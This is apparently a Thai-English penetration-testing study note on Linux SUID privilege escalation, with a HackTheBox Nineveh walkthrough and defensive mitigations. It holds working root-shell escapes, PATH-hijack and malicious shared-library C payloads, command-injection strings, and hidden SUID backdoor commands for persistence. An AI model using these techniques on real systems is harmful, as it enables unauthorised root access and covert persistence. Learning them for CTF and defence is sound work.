#privesc #linux #suid #gtfobins

# SUID Exploitation

## Overview
SUID (Set User ID) เป็น permission bit พิเศษใน Linux ที่ทำให้ไฟล์ทำงานด้วยสิทธิ์ของเจ้าของไฟล์ แทนที่จะเป็นสิทธิ์ของคนรัน หากไฟล์มี SUID bit และเจ้าของเป็น root เราจะสามารถใช้มัน escalate privilege ได้

**Related Topics:** [[⬆️ Privilege Escalation Linux]] | [[GTFOBins]] | [[Linux Permissions]] | [[File System]]

---

## Concept & Theory

### SUID Bit คืออะไร
- Permission bit พิเศษที่แสดงด้วย `s` แทน `x` ใน owner execute permission
- เมื่อ user รันไฟล์ที่มี SUID bit process จะทำงานด้วยสิทธิ์ของ file owner
- ใช้สำหรับโปรแกรมที่ต้องการสิทธิ์สูงเพื่อทำงาน เช่น `passwd`, `sudo`

### Permission Format
```
-rwsr-xr-x  1 root root  /usr/bin/passwd
 ↑ s = SUID bit set
```

**SUID bit values:**
- `4` = SUID bit (4000 in octal notation)
- `-rwsr-xr-x` = SUID set, executable by owner
- `-rwSr-xr-x` = SUID set, NOT executable (capital S)

> [!tip] GTFOBins Integration
> [[GTFOBins]] เป็น database ของ Unix binaries ที่สามารถใช้ bypass security restrictions ได้ รวมถึง SUID exploitation ควรเช็คเสมอเมื่อเจอ SUID binaries

---

## Enumeration

### 1. หา SUID Files ทั้งหมด

```bash
# หาไฟล์ทั้งหมดที่มี SUID bit set
find / -perm -u=s -type f 2>/dev/null

# แบบละเอียดขึ้น แสดง permissions และ owner
find / -perm -4000 -type f -ls 2>/dev/null

# หาเฉพาะที่ owner เป็น root
find / -user root -perm -4000 -type f 2>/dev/null

# หา SUID files ใน common directories
find /usr/bin /usr/local/bin /usr/sbin -perm -4000 -type f 2>/dev/null
```

### 2. เช็ค SUID Files แบบละเอียด

```bash
# ตรวจสอบ binary type และ capabilities
ls -la $(find / -perm -4000 2>/dev/null)

# เช็คว่า binary มี capabilities อะไรบ้าง
getcap -r / 2>/dev/null

# ดู strings ใน binary เพื่อหา hardcoded paths หรือ commands
strings /path/to/suid_binary | grep -E "^/|sh$|bash$"
```

### 3. Compare กับ Default SUID Files

```bash
# บน target machine
find / -perm -4000 -type f 2>/dev/null > /tmp/suid_files.txt

# เปรียบเทียบกับ default SUID files ของ OS นั้นๆ
# Files ที่ไม่ได้มาตรฐานมักจะเป็นจุดอ่อน
```

> [!warning] Common Vulnerable SUID Binaries
> บาง binaries ที่มี SUID และสามารถ exploit ได้ง่าย:
> - Custom/unknown binaries (ไม่ใช่ system default)
> - Old versions ที่มี known vulnerabilities
> - Binaries ที่อยู่ใน GTFOBins database
> - Programs ที่ call external commands โดยไม่ validate

---

## Exploitation Techniques

### Method 1: GTFOBins SUID Binaries

ใช้ [[GTFOBins]] เช็คว่า SUID binary ที่เจอสามารถ exploit ได้หรือไม่

```bash
# Example: find binary with SUID
find / -name python* -perm -4000 2>/dev/null
# Output: /usr/bin/python3.9

# Check GTFOBins for python SUID exploit
# https://gtfobins.github.io/gtfobins/python/#suid
```

**Common GTFOBins SUID Exploits:**

#### nano
```bash
# หาก nano มี SUID bit
./nano
# กด Ctrl+R, Ctrl+X
reset; sh 1>&0 2>&0
```

#### vim/vi
```bash
# vim SUID exploitation
./vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# หรือใช้ vim command mode
./vim
:set shell=/bin/sh
:shell
```

#### find
```bash
# find SUID can execute commands
./find . -exec /bin/sh -p \; -quit

# หรือใช้แบบนี้
./find . -exec whoami \; -quit  # ทดสอบก่อนว่าได้ root privileges
```

#### awk
```bash
# awk SUID exploitation
./awk 'BEGIN {system("/bin/sh -p")}'
```

#### python/python3
```bash
# Python SUID shell
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Python3 version
./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Method 2: Bash/Shell with SUID

```bash
# หาก bash หรือ sh มี SUID bit (หายาก แต่เจอบ่อยใน CTF)
/bin/bash -p
# -p flag = preserve privileges (ไม่ drop SUID)

# หรือ
/bin/sh -p

# เช็คว่าได้ root จริงหรือไม่
whoami  # ควรเป็น root
id      # ควรเห็น euid=0(root)
```

> [!tip] ทำไมต้องใช้ -p flag
> โดย default bash จะ drop privileges ถ้า real UID ไม่เท่ากับ effective UID (security feature)
> `-p` flag บอก bash ให้ preserve effective UID ไว้

### Method 3: Custom Binary Exploitation

#### Path Hijacking
หาก SUID binary เรียก command โดยไม่ใช้ absolute path สามารถ hijack ได้

```bash
# สมมติว่า /usr/local/bin/backup มี SUID และมี code:
# system("tar -czf /tmp/backup.tar.gz /home/user");
# ↑ ไม่ได้ใช้ absolute path /bin/tar

# สร้าง fake tar command
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash -p' >> /tmp/tar
chmod +x /tmp/tar

# เปลี่ยน PATH ให้ /tmp อยู่ข้างหน้า
export PATH=/tmp:$PATH

# รัน SUID binary
/usr/local/bin/backup
# จะได้ root shell!
```

#### Library Hijacking (LD_PRELOAD)
```bash
# สร้าง malicious shared library
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# Compile เป็น shared library
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# ใช้กับ SUID binary (ไม่ใช่ทุกตัว ขึ้นอยู่กับ binary)
LD_PRELOAD=/tmp/evil.so /path/to/suid_binary
```

> [!warning] LD_PRELOAD Limitations
> Modern Linux จะ ignore LD_PRELOAD สำหรับ SUID binaries (security feature)
> แต่บาง custom binaries หรือ misconfigured systems อาจยังใช้ได้

#### Command Injection in SUID Binary
```bash
# สมมติว่า SUID binary รับ input แล้วส่งไปยัง system() โดยไม่ sanitize
# Example: /usr/local/bin/ping_tool ที่ทำ: system("ping -c 1 " + user_input)

# Inject command
/usr/local/bin/ping_tool "127.0.0.1; /bin/bash -p"

# หรือใช้ backticks
/usr/local/bin/ping_tool "127.0.0.1 | bash -p"

# หรือ &&
/usr/local/bin/ping_tool "127.0.0.1 && bash -p"
```

### Method 4: Shared Object Injection

```bash
# ใช้ strace ดูว่า binary พยายาม load shared library ไหน
strace /path/to/suid_binary 2>&1 | grep -iE "open|access|no such file"

# ถ้าเห็นว่ามันพยายาม load .so file ที่ไม่มี
# Example output: open("/home/user/.config/libcustom.so", O_RDONLY) = -1 ENOENT

# สร้าง malicious .so file
cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /home/user/.config/libcustom.so /tmp/exploit.c

# รัน SUID binary อีกครั้ง
/path/to/suid_binary
```

---

## Real CTF Example: HackTheBox - Nineveh

**Scenario:** เจอ custom SUID binary `/usr/local/bin/backup` ที่ทำ backup files

### Reconnaissance
```bash
# หา SUID files
find / -perm -4000 -type f 2>/dev/null
# พบ: /usr/local/bin/backup (owner: root)

# ดู strings ใน binary
strings /usr/local/bin/backup | grep -E "^/|sh$|tar|cp"
# พบ: tar -czf /tmp/backup.tar.gz
# ↑ ไม่ได้ใช้ absolute path!
```

### Exploitation
```bash
# สร้าง fake tar command
mkdir /tmp/exploit
cd /tmp/exploit
cat > tar << 'EOF'
#!/bin/bash
# Fake tar command - Path Hijacking exploit
/bin/bash -p
EOF
chmod +x tar

# Hijack PATH
export PATH=/tmp/exploit:$PATH

# ทดสอบว่า PATH ถูกต้อง
which tar
# Output: /tmp/exploit/tar ✓

# รัน SUID binary
/usr/local/bin/backup

# ได้ root shell!
id
# uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root)

cat /root/root.txt
# FLAG: HTB{p4th_h1j4ck1ng_1s_34sy}
```

---

## Post-Exploitation

### Maintain Access
```bash
# หลังได้ root shell แล้ว สร้าง backdoor SUID shell
cp /bin/bash /tmp/.hidden_shell
chmod 4755 /tmp/.hidden_shell

# ครั้งต่อไปเข้ามาใหม่
/tmp/.hidden_shell -p
```

### Persistence via SUID
```bash
# สร้าง SUID wrapper script (ต้องเป็น binary ไม่ใช่ script)
cat > /tmp/suid_wrapper.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF

gcc /tmp/suid_wrapper.c -o /usr/local/bin/.backup
chmod 4755 /usr/local/bin/.backup
```

---

## Defense & Mitigation

### For Defenders
1. **Audit SUID files regularly**
   ```bash
   find / -perm -4000 -type f 2>/dev/null > suid_baseline.txt
   ```

2. **Remove unnecessary SUID bits**
   ```bash
   chmod u-s /path/to/binary
   ```

3. **Use capabilities instead of SUID**
   ```bash
   # แทนที่จะใช้ SUID ใช้ capabilities
   setcap cap_net_raw+ep /usr/bin/ping
   ```

4. **Monitor for new SUID files** (using file integrity monitoring)

5. **Secure coding practices:**
   - ใช้ absolute paths ใน system calls
   - Validate และ sanitize user input
   - Drop privileges เมื่อไม่จำเป็น

### Detection
```bash
# หา SUID files ที่ถูกสร้างใหม่
find / -perm -4000 -type f -mtime -7 2>/dev/null

# Monitor ด้วย auditd
auditctl -w /usr/bin -p wa -k suid_monitor
```

---

## Tools & Resources

### Automated Tools
```bash
# linPEAS - Linux Privilege Escalation Awesome Script
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Unix-privesc-check
wget https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
```

### Useful Links
- [[GTFOBins]] - https://gtfobins.github.io/
- SUID Exploitation Cheatsheet
- [[Linux Privilege Escalation]] techniques

---

## Quick Reference

```bash
# หา SUID files
find / -perm -4000 -type f 2>/dev/null

# เช็ค GTFOBins สำหรับ binary ที่เจอ
# https://gtfobins.github.io/

# Common SUID exploits:
bash -p                          # bash SUID
find . -exec /bin/sh -p \; -quit # find SUID
./vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-p")' # vim SUID

# Path hijacking template:
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/[command]
chmod +x /tmp/[command]
```

**Tags:** #privesc #linux #suid #gtfobins #privilege-escalation

**Related:** [[⬆️ Privilege Escalation Linux]] | [[GTFOBins]] | [[Linux Capabilities]] | [[PATH Hijacking]] | [[File Permissions]]